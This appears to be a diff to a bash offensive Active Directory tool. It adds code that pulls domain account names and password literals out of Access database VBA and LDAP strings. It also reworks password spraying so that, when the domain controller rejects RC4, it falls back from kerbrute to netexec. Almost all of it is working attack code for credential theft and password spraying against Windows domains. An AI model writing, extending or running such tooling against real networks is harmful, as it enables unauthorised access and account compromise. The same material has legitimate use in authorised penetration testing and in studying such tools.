@@ -22,9 +22,10 @@ set -o pipefail
 # ===========================================================================
 #  METADATA
 # ===========================================================================
-readonly VERSION="1.49.0"
+readonly VERSION="1.49.1"
 readonly AUTHOR="c4sh3r"
 KERBRUTE_BIN="${KERBRUTE_BIN:-/opt/kerbrute}"
+KERBRUTE_RC4_DEAD=0               # set when the DC rejects RC4 (KDC_ERR_ETYPE_NOSUPP) → kerbrute unusable, spray via netexec
 
 # ===========================================================================
 #  TERMINAL UI  (colors + glyphs + section helpers)
@@ -4709,6 +4710,36 @@ _accdb_loot() {
     printf '%s\n' "$txt" | grep -iE 'LDAP://|DC=|password|pwd|[A-Za-z0-9.-]+\\[A-Za-z0-9._-]+' \
         | grep -ivE '^<|schemas\.microsoft|keyEncryptor' | sort -u >>"$outf"
     [[ -s "$outf" ]] && { loot "  Access DB content (tables + VBA strings) → $(basename "$outf")"; grep -vE '^### |^[[:space:]]*$' "$outf" | head -25; }
+
+    # Pull the AD account a VBA/LDAP-bind embeds (DOMAIN\user) + its password literal.
+    # harvest_secrets alone is unreliable here: the bare username ('ldapreader') is
+    # neither an email nor first.last so it never reaches users_all.txt, and the real
+    # password is just one of dozens of strong tokens (capped/sorted away). ANCHOR on
+    # the domain's OWN netbios name so Windows paths (Program Files\…, Windows\System32)
+    # aren't mistaken for accounts, and take the token that immediately follows the
+    # user literal as the password (the usual strUser="dom\u"; strPassword="…" layout).
+    local nb="${DOMAIN%%.*}"
+    if [[ -n "$nb" ]]; then
+        local sf; sf=$(mktemp)
+        printf '%s\n' "$txt" | grep -aoiE "${nb}\\\\[A-Za-z0-9._-]{2,}|[A-Za-z0-9!@#\$%^&*._-]{6,40}" >"$sf"
+        local ln du user pass
+        while IFS=: read -r ln du; do
+            user="${du##*\\}"; _is_valid_identity "$user" || continue
+            echo "$user" >>"$OUTDIR/users_all.txt"
+            note_cred_source "$user" "Access DB VBA/LDAP literal ($base)"
+            pass=$(sed -n "$((ln+1))p" "$sf")
+            if [[ -n "$pass" && "$pass" != *\\* ]] && _plausible_secret "$pass"; then
+                loot "★ Access DB credential → ${C_GREEN}${C_BOLD}${user} : ${pass}${C_RESET}"
+                add_secret "$pass" "Access DB VBA ($base)"
+                queue_cred "$user" "$pass" "" "Access DB VBA bind ($base)"
+            else
+                loot "★ Access DB embedded account → ${C_BOLD}${du}${C_RESET} (queued for spray with recovered secrets)"
+            fi
+        done < <(grep -niE "^${nb}\\\\[A-Za-z0-9._-]{2,}$" "$sf")
+        rm -f "$sf"
+        sort -u -o "$OUTDIR/users_all.txt" "$OUTDIR/users_all.txt" 2>/dev/null
+    fi
+
     harvest_secrets <<<"$txt" "accdb:${base}"
 }
 
@@ -5379,7 +5410,7 @@ phase_user_variants() {
 # ===========================================================================
 # True only when KERBRUTE_BIN is a real, runnable binary (NOT a directory —
 # some installs leave /opt/kerbrute as a folder, and `-x` is true on dirs).
-_kerbrute_ok() { [[ -n "$KERBRUTE_BIN" && -f "$KERBRUTE_BIN" && -x "$KERBRUTE_BIN" ]]; }
+_kerbrute_ok() { [[ "${KERBRUTE_RC4_DEAD:-0}" != "1" && -n "$KERBRUTE_BIN" && -f "$KERBRUTE_BIN" && -x "$KERBRUTE_BIN" ]]; }
 
 _confirm_plain_cred() {
     local u="$1" pw="$2" src="${3:-spray}"
@@ -5459,17 +5490,29 @@ _seed_anon_weak_spray() {
 }
 
 _spray_one() {
-    local pw="$1" u line
+    local pw="$1" u line out
     if _kerbrute_ok; then
-        while read -r u; do
-            [[ -z "$u" ]] && continue
-            _confirm_plain_cred "$u" "$pw" "kerbrute spray" || continue
-            loot "★ Valid credential found by spray → ${C_GREEN}${u} : ${pw}${C_RESET}"
-            note_cred_source "${u}:${pw}" "password spray (kerbrute)"
-            queue_cred "$u" "$pw" "" "password spray"
-        done < <("$KERBRUTE_BIN" passwordspray -d "$DOMAIN" --dc "$DC_IP" "$OUTDIR/users_all.txt" "$pw" 2>&1 \
-                   | tee -a "$LOGFILE" | grep -i 'VALID LOGIN' | grep -oiP 'VALID LOGIN:\s+\K\S+?(?=@)')
-    else
+        out=$("$KERBRUTE_BIN" passwordspray -d "$DOMAIN" --dc "$DC_IP" "$OUTDIR/users_all.txt" "$pw" 2>&1)
+        printf '%s\n' "$out" >>"$LOGFILE"
+        # kerbrute always uses RC4 for the AS-REQ. RC4-disabled DCs (Server 2022/2025,
+        # hardened) answer KDC_ERR_ETYPE_NOSUPP to EVERY attempt → the whole spray is
+        # dead weight. Detect it ONCE, mark kerbrute unusable, and fall back to netexec
+        # (NTLM, or Kerberos-with-password which derives AES) for the rest of the run.
+        if grep -qi 'ETYPE_NOSUPP' <<<"$out"; then
+            [[ "$KERBRUTE_RC4_DEAD" != "1" ]] && warn "kerbrute: DC rejects RC4 (KDC_ERR_ETYPE_NOSUPP) → spraying via netexec for the rest of the run"
+            KERBRUTE_RC4_DEAD=1
+        else
+            while read -r u; do
+                [[ -z "$u" ]] && continue
+                _confirm_plain_cred "$u" "$pw" "kerbrute spray" || continue
+                loot "★ Valid credential found by spray → ${C_GREEN}${u} : ${pw}${C_RESET}"
+                note_cred_source "${u}:${pw}" "password spray (kerbrute)"
+                queue_cred "$u" "$pw" "" "password spray"
+            done < <(grep -i 'VALID LOGIN' <<<"$out" | grep -oiP 'VALID LOGIN:\s+\K\S+?(?=@)')
+            return
+        fi
+    fi
+    {
         # netexec fallback: spray this one password across every user over SMB.
         # Use Kerberos (-k) + FQDN when in Kerberos mode — many DCs disable NTLM
         # (STATUS_NOT_SUPPORTED), and Kerberos spray succeeds where NTLM can't.
@@ -5493,7 +5536,7 @@ _spray_one() {
             queue_cred "$u" "$pw" "" "password spray"
         done < <($NXC smb "$DCT" -u "$OUTDIR/users_all.txt" -p "$pw" "${kflag[@]}" --continue-on-success 2>&1 \
                    | tee -a "$LOGFILE" | grep -iE '\[\+\]|STATUS_PASSWORD_MUST_CHANGE')
-    fi
+    }
 }
 
 phase_password_spray() {
